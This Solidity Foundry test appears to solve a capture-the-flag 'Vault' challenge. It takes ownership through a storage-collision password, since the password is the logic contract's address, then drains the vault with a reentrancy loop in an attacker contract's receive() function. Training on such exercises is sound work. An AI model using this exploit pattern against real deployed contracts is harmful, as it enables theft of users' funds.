// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        Attacker attack = new Attacker(payable(address(vault)));
        bytes32 passWord = bytes32(uint256(uint160(address(logic))));
        bytes memory data = abi.encodeWithSignature(
            "changeOwner(bytes32,address)",
            passWord,
            address(attack)
        );
        (bool success,) = address(vault).call(data);
        require(success, "call failed");
        attack.attack{value:0.1 ether}();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}

contract Attacker {
    address payable public vault;

    constructor(address payable _vault) {
        vault =_vault;
    }

    function attack() public payable {
        Vault(vault).openWithdraw();
        Vault(vault).deposite{value: msg.value}();
        Vault(vault).withdraw();
    }
    
    receive() external payable {
        if (vault.balance > 0) {
            Vault(vault).withdraw();
        }
    }
}
